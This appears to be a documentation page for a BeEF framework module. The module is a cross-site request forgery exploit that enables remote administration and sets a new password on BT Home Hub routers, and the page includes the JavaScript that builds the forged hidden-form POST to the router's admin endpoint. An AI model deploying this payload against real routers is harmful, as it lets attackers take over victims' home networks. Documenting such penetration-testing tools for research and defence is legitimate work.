## Summary

* **Objective**: enable remote administration and change the password on a BT Home Hub wireless router.
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/bt_home_hub_csrf)

## Internal Working

Creates iframes with POST requests to enable remote administration and change the password on a BT Home Hub wireless router.

```js

var bt_home_hub_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "/cgi/b/ras//?ce=1&be=1&l0=5&l1=5", "POST", "application/x-www-form-urlencoded", [
    {'type':'hidden', 'name':'0',  'value':'31'} ,
    {'type':'hidden', 'name':'1',  'value':''},
    {'type':'hidden', 'name':'30', 'value':passwd}
]);


```

## Feedback

